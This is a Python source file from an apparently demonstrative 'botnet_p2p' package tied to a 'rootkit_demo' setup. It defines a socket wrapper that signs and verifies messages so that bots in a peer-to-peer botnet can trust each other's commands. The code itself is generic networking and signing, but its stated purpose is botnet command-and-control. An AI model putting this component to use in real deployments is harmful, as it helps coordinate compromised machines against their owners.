"""Socket wrapper with messages that are signed"""

import socket
from typing import Tuple

from botnet_p2p import (
    BUFFER_SIZE,
    ENCODING,
    MSGTYPE_MSG_SEPARATOR,
    MSG_SIGNEDHASH_SEPARATOR,
    logger,
)

from botnet_p2p.security import sign_hash, calculate_hash, verify_message

from botnet_p2p.message import get_msg_data, get_msg_type, get_signed_hash

address = Tuple[str, int]


class NodeP2P(object):
    """Socket wrapper to send and received signed messages"""

    def __init__(
        self,
        public_key_path: str = "/etc/rootkit_demo/public/botnet_p2p/public_key",
        private_key_path: str = "/etc/rootkit_demo/private_key",
        already_created_socket: socket.socket = None,
    ):
        """ Create an instance of a socket class

            Args:
                public_key_path: Path where public key is located
                private_key_path: Path where private key is located
                already_created_socket: Socket to wrap with this class
        """
        if already_created_socket:
            self.__socket = already_created_socket
        else:
            self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.__public_key_path = public_key_path
        self.__private_key_path = private_key_path

    def bind(self, server_host: str, server_port: int):
        self.__socket.bind((server_host, server_port))

    def listen(self, max_queue_elements: int):
        self.__socket.listen(max_queue_elements)

    def accept(self) -> (socket.socket, address):
        client_socket, addr = self.__socket.accept()
        return (
            NodeP2P(self.__public_key_path, self.__private_key_path, client_socket),
            addr,
        )

    def connect(self, server_host: str, server_port: int):
        self.__socket.connect((server_host, server_port))

    def close(self):
        self.__socket.close()

    def set_private_key_path(self, private_key_path: str):
        """ Change private key path in case we want to use a different one 

            Args:
                private_key_path: Path were private key is located
        """
        self.__private_key_path = private_key_path

    def send_signed_msg(self, msg_type: int, msg: str):
        final_msg = self.__build_msg_structure(msg_type, msg)
        self.__socket.send(final_msg)

    def recv_signed_msg(self) -> (int, str, bool):
        raw_msg = self.__socket.recv(BUFFER_SIZE)
        msg_type, msg_data, signed_hash = self.__extract_info_from_message(raw_msg)
        msg_type_data = f"{msg_type}{MSGTYPE_MSG_SEPARATOR}{msg_data}"
        comes_from_trusted_source = verify_message(
            self.__public_key_path, msg_type_data, signed_hash
        )
        logger.debug(
            f"Raw message: {raw_msg}"
            + f"Comes from a trusted source? {comes_from_trusted_source}"
        )
        return msg_type, msg_data, comes_from_trusted_source

    def __build_msg_structure(self, msg_type: int, msg: str) -> bytes:
        """ Build message following a structure so every bot in the P2P
            can understand each other

            Args:
                msg_type: Type of the message you want to send
                msg: The message itself

            Returns:
                Bytes in a structured format
        """
        msg = f"{msg_type}{MSGTYPE_MSG_SEPARATOR}{msg}"
        msg_hash = calculate_hash(msg)
        signed_hash = sign_hash(msg_hash, self.__private_key_path)
        final_msg = (
            msg.encode(ENCODING)
            + f"{MSG_SIGNEDHASH_SEPARATOR}".encode(ENCODING)
            + signed_hash
        )
        return final_msg

    def __extract_info_from_message(self, raw_msg: bytes) -> (int, str, bytes):
        """ Extract relevant fields from the received message knowing it
            follows a specific structure

            Args:
                msg: Message in bytes

            Returns:
                The characteristic fields of the message:
                message type, data and hash
        """
        raw_msg_str = raw_msg.decode(ENCODING)
        msg_type = get_msg_type(raw_msg_str)
        msg_data = get_msg_data(raw_msg_str)
        signed_hash = get_signed_hash(raw_msg_str)
        logger.debug(
            f"  Message received: \n"
            + f"  Message type: {msg_type}\n"
            + f"  Message: {msg_data}\n"
            + f"  Signed hash: {signed_hash}\n\n"
        )
        return msg_type, msg_data, signed_hash
